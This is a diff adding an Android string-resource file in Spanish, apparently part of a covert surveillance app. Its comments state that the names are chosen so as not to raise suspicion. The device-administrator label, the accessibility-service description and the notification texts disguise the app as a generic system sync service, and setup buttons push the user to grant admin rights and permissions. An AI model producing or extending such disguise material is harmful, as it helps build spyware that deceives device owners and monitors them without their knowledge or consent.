@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <!-- Nombre neutro que no levanta sospechas -->
+    <string name="app_name">Sincronización de medios</string>
+
+    <!-- Device Admin — se ve en Ajustes > Seguridad -->
+    <string name="device_admin_label">Servicio de sincronización</string>
+    <string name="device_admin_description">Servicio de sincronización y copia de seguridad del sistema</string>
+
+    <!-- Notificación del servicio en primer plano -->
+    <string name="notification_channel_name">Servicios del sistema</string>
+    <string name="notification_channel_description">Servicios en segundo plano del sistema</string>
+    <string name="notification_title">Sincronización activa</string>
+    <string name="notification_text">Sincronizando datos…</string>
+
+    <!-- Accessibility Service — descripción neutra -->
+    <string name="accessibility_service_description">Servicio de accesibilidad del sistema para sincronización</string>
+
+    <!-- Setup -->
+    <string name="setup_title">Configuración inicial</string>
+    <string name="btn_next">Siguiente</string>
+    <string name="btn_activate_admin">Activar administrador</string>
+    <string name="btn_grant_permissions">Conceder permisos</string>
+    <string name="btn_finish">Finalizar</string>
+</resources>
